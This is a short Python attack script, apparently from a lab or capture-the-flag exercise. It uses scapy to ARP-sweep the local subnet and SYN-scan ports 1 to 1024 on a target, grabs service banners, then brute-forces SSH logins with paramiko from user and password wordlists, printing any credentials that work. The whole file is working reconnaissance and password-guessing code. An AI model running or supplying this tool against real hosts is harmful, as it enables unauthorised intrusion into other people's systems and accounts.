import ipaddress
import sys
from scapy.all import *
import scapy.layers.l2
from scapy.layers.inet import TCP, IP
import paramiko

# Getting ip for available interfaces
cmd = """ip -br -4 add | awk -F" " '{print $3}'"""
interfaces = subprocess.check_output(cmd, shell=True).decode('utf8').splitlines()

inet = []
for interface in interfaces:
    inet.append(interface.split())

# Show IP and Mask
print(f' Address {ipaddress.ip_interface(inet[1][0]).ip}')
print(f' Mask {ipaddress.ip_interface(inet[1][0]).network.netmask}')

subnet_address = str(ipaddress.ip_interface(inet[1][0]).network.network_address)
subnet_prefix = str(ipaddress.ip_interface(inet[1][0]).network.prefixlen)
target_subnet = subnet_address + '/' + subnet_prefix

# Show active ip in subnet
print("Active IP's in subnet")
packet = scapy.layers.l2.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.layers.l2.ARP(pdst=target_subnet)
ans, unans = srp(packet, timeout=1, verbose=0)
for snd, rcv in ans:
    print(f'IP: {snd.pdst}, MAC: {rcv.src}')

# Show open ports on target IP
target = str(input("Enter IP address of target machine: "))
packet = (IP(dst=target) / TCP(sport=random.randint(5000, 65535), dport=(1, 1024), flags="S"))
ans, unans = sr(packet, timeout=1, verbose=0)

openports = []
for snd, rcv in ans:
    if rcv[TCP].flags == "SA":
        print(f'Port {rcv[TCP].sport} on {target} is open')
        openports.append(rcv[TCP].sport)

# Show banners for openports
for openport in openports:
    try:
        s=socket.socket()
        s.connect((target,openport))
        s.settimeout(3)
        banner = s.recv(100).decode('utf-8').strip('\n')
        s.close()
        print (f" port {openport} : {banner}")
    except TimeoutError:
        print("Timeout")

# Use wordlist for get creditionals
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.load_system_host_keys()
found = False
with open("planets.txt", "r") as users:
    for user in users:
        if found == True:
            break
        with open("userpaswd.txt", "r") as passwords:
            for password in passwords:
                try:
                    ssh.connect(target, username=user.strip(), password=password.strip())
                except paramiko.AuthenticationException:
                    print(f' Bad cred {user.strip()} : {password.strip()}')
                else:
                    print(f' Correct cred is user {user.strip()} and password {password.strip()}')
                    found = True
                    break